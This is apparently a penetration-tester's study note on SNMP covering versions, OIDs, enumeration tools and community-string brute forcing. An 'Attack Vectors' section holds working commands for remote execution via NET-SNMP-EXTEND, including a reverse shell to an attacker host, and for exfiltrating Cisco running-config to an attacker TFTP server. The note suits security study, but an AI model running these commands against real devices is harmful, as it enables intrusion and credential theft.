# SNMP

#SNMP #SimpleNetworkManagementProtocol #networkmanagement

## What is SNMP?
Simple Network Management Protocol — monitors and controls network devices (routers, switches, printers, servers). Stores device metadata and configuration in a structured database (MIB).

- Port **UDP 161** — SNMP agent (receive queries/commands)
- Port **UDP 162** — SNMP trap receiver (agent sends events to manager)
- Community strings act as passwords for access control
- Common targets: routers, switches, IoT devices, Windows/Linux servers

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Network/snmpwalk\|snmpwalk]] | Walk the OID tree (`snmpbulkwalk` for v2c bulk); `snmpset` for write |
| [[Tools/Network/snmp-check\|snmp-check]] | Human-readable enumeration (users, processes, software, network, storage) |
| [[Tools/Network/onesixtyone\|onesixtyone]] | Fast community-string brute force |
| [[Tools/Network/braa\|braa]] | Mass/multi-target OID scanner |
| [[Tools/Scanning/NMAP\|NMAP]] | `snmp-info`/`snmp-brute`/`snmp-*` NSE |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `snmp_login` brute, `snmp_enum*` modules |

`snmpset` (write via a RW community — the path to RCE/config exfil below) ships with `snmpwalk` in the net-snmp package.

---

## SNMP Versions

| Version | Auth | Encryption | Notes |
|---|---|---|---|
| SNMPv1 | Community string | None | Plaintext everything; no auth validation |
| SNMPv2c | Community string | None | Adds 64-bit counters and bulk operations; still plaintext |
| SNMPv3 | Username + password | Yes (AES/DES) | Authentication + encryption via pre-shared key |

---

## Key Concepts

### MIB (Management Information Base)
- ASCII text database containing OIDs and device metadata
- Stored locally on manager; describes what each OID means
- Common MIB files in `/usr/share/snmp/mibs/`

### OID (Object Identifier)
- Hierarchical namespace for SNMP objects
- Dot-separated integers: `1.3.6.1.2.1.1.1.0` = sysDescr
- Each managed object has a unique OID

### Community Strings
- SNMPv1/v2c access control — like a plaintext password
- `public` = read-only (default, often unchanged)
- `private` = read-write (default, often unchanged)
- Passed in cleartext — sniffable

---

## Configuration Files

| File | Description |
|---|---|
| `/etc/snmp/snmpd.conf` | Linux SNMP daemon config |
| `/etc/snmp/snmptrapd.conf` | Trap receiver config |
| `C:\WINDOWS\system32\snmp.dll` | Windows SNMP service |

---

## Enumeration

### snmpwalk

```bash
# Walk entire OID tree (v1, public community)
snmpwalk -v 1 -c public <target>

# Walk with v2c
snmpwalk -v 2c -c public <target>

# Walk specific OID
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.1  # System info

# Bulk walk — far faster on v2c (GETBULK instead of GETNEXT per-OID)
snmpbulkwalk -v 2c -c public <target>

# Walk with MIB translation (readable output)
snmpwalk -v 2c -c public -m ALL <target>

# Common useful OIDs to walk:
# 1.3.6.1.2.1.1       - sysDescr, system info
# 1.3.6.1.2.1.25.1.6  - running processes
# 1.3.6.1.2.1.25.4.2  - installed software
# 1.3.6.1.2.1.25.6    - installed packages
# 1.3.6.1.4.1.77.1.2  - Windows user accounts (Microsoft MIB)
# 1.3.6.1.2.1.6       - TCP connections table
# 1.3.6.1.2.1.4       - IP routing table
```

### onesixtyone (Community String Brute Force)

```bash
# Single target, default wordlist
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <target>

# Multiple targets
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/snmp.txt -i targets.txt

# Custom community strings file
onesixtyone -c community_strings.txt <target>
```

### snmp-check (Human-Readable Enum)

```bash
# One command → formatted users, processes, software, network interfaces, routing, storage
snmp-check -c public -v 2c <target>
snmp-check -c public -w <target>       # -w also tests write access (RW community?)
```

### braa (Mass SNMP Scanner)

```bash
# Scan single target
braa public@<target>:.1.3.6.*

# Multiple targets
braa public@<target1>:.1.3.6.* public@<target2>:.1.3.6.*

# Get specific OID
braa community@<target>:1.3.6.1.2.1.1.1.0
```

### Nmap

```bash
nmap -sU -p 161 --script snmp-info,snmp-sysdescr,snmp-processes,snmp-netstat -sV <target>
nmap -sU -p 161 --script snmp-brute <target>
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/path/to/communities.txt <target>
```

### Metasploit

```bash
use auxiliary/scanner/snmp/snmp_login     # brute force community strings
use auxiliary/scanner/snmp/snmp_enum      # enumerate after auth
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_enumshares
```

---

## Attack Vectors

### Enumerate Windows via SNMP

```bash
# Users (if Windows SNMP with Microsoft MIB)
snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.77.1.2.25

# Running processes
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2

# TCP connections
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13.1.3

# Network interfaces
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.2.2.1
```

### Modify Device Config via Read-Write Community

```bash
# Set a value (if rwcommunity is found)
snmpset -v 2c -c private <target> <OID> <type> <value>

# Example: change sysContact
snmpset -v 2c -c private <target> 1.3.6.1.2.1.1.4.0 s "admin@attacker.com"

# Cisco: change routing, enable interfaces, etc. via SNMP write
```

### Read-Write Community → RCE (NET-SNMP Extend)

**Conditions:** a **read-write** community string on a Linux host running the `net-snmp` daemon (`snmpd`). The `NET-SNMP-EXTEND-MIB` lets you register an arbitrary command and then read its output back — full command execution as the `snmpd` user (often root).

```bash
# 1. Register a command (createAndGo = RowStatus 4). Name the entry "attack".
snmpset -v 2c -c <rw_community> <target> \
  'NET-SNMP-EXTEND-MIB::nsExtendStatus."attack"'  = createAndGo \
  'NET-SNMP-EXTEND-MIB::nsExtendCommand."attack"' = /bin/bash \
  'NET-SNMP-EXTEND-MIB::nsExtendArgs."attack"'    = '-c "id; uname -a"'

# 2. Read the command output back
snmpwalk -v 2c -c <rw_community> <target> 'NET-SNMP-EXTEND-MIB::nsExtendOutputFull."attack"'
#   numeric form if MIBs unavailable:  .1.3.6.1.4.1.8072.1.3.2.3.1.2  (nsExtendOutputFull)
#   config table base (set here):      .1.3.6.1.4.1.8072.1.3.2.2.1   (nsExtendConfigTable)

# 3. Weaponise → reverse shell
snmpset -v 2c -c <rw_community> <target> \
  'NET-SNMP-EXTEND-MIB::nsExtendStatus."rev"'  = createAndGo \
  'NET-SNMP-EXTEND-MIB::nsExtendCommand."rev"' = /bin/bash \
  'NET-SNMP-EXTEND-MIB::nsExtendArgs."rev"'    = '-c "bash -i >& /dev/tcp/<attacker>/9001 0>&1"'
snmpwalk -v 2c -c <rw_community> <target> 'NET-SNMP-EXTEND-MIB::nsExtendOutputFull."rev"'  # triggers it
```

### Cisco Config Exfil via SNMP + TFTP

**Conditions:** a RW community on a Cisco IOS device. `CISCO-CONFIG-COPY-MIB` copies `running-config` (which contains Type-7/Type-5 credentials) to an attacker-controlled TFTP server — no CLI login required.

```bash
# Start an attacker TFTP server first (see [[Services/File Xfer/TFTP|TFTP]] / Network Device Pentesting)
# Then trigger the copy (ccCopySourceFileType=4 runningConfig, DestType=1 networkFile, Protocol=1 tftp):
COMM=<rw_community>; IP=<attacker_tftp>; R=666   # R = arbitrary random row index
snmpset -v 2c -c $COMM <target> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.2.$R i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.$R i 4 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.$R i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.$R a $IP \
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.$R s "running-config.txt" \
  1.3.6.1.4.1.9.9.96.1.1.1.1.14.$R i 4     # ccCopyEntryRowStatus = createAndGo
# running-config.txt lands on your TFTP server → crack Type-7 (reversible) / Type-5 (hashcat)
```

### SNMPv3 Credential Attack

```bash
# If SNMPv3 username known — brute force auth password
use auxiliary/scanner/snmp/snmp_login
# Or snmp-check / nmap with user/pass lists
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `rocommunity public default` | Read the whole MIB from anywhere with the default string |
| `rwcommunity public <IP>` / `rwcommunity6` | **Read-write** with default string → config change, **RCE**, config exfil |
| `rwuser noauth` | Full OID tree read-write without authentication |
| net-snmp with a RW community | `nsExtend` arbitrary command execution (RCE as snmpd user) |
| Cisco RW community | `CISCO-CONFIG-COPY-MIB` running-config exfil to attacker TFTP |
| SNMPv1/v2c only | Community strings sent in cleartext — sniffable |
| SNMPv3 usernames guessable / no `authPriv` | User enumeration; auth-only (no priv) leaves data in cleartext |
| `write` community exposed | Modify routing/interfaces/device configuration |

---

## Quick Reference

| Goal | Command |
|---|---|
| Walk OID tree | `snmpwalk -v 2c -c public host` |
| Bulk walk (v2c) | `snmpbulkwalk -v 2c -c public host` |
| Human-readable enum | `snmp-check -c public -v 2c host` |
| RW → RCE (net-snmp) | `snmpset ... nsExtendStatus."x"=createAndGo nsExtendCommand."x"=/bin/bash ...` |
| RW → Cisco config exfil | `snmpset` on `CISCO-CONFIG-COPY-MIB` → TFTP |
| Brute community string | `onesixtyone -c communities.txt host` |
| Mass scan | `braa public@host:.1.3.6.*` |
| Nmap scan | `nmap -sU -p 161 --script snmp-info host` |
| Enum users (Windows) | `snmpwalk -v 2c -c public host 1.3.6.1.4.1.77.1.2.25` |
| Enum processes | `snmpwalk -v 2c -c public host 1.3.6.1.2.1.25.4.2.1.2` |
| MSF community brute | MSF `auxiliary/scanner/snmp/snmp_login` |

---

> [!note] **See also** — lights-out/management sibling [[Services/Network Management/IPMI|IPMI]] (BMC out-of-band management is the other UDP management surface with weak default auth). A RW community on network gear feeds [[Techniques/Network Device Pentesting|Network Device Pentesting]] — running-config exfil lands via [[Services/File Xfer/TFTP|TFTP]] (Cisco Type-7/Type-5 credential looting). The same `snmpset` config-copy is used against ASA appliances in [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]].
> Also [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (CPTS v2) — SNMP quick enum incl. process-args OID and `nsExtendObjects`.

---

*Created: 2026-07-13*
*Updated: 2026-10-08*
*Model: claude-opus-4-8*
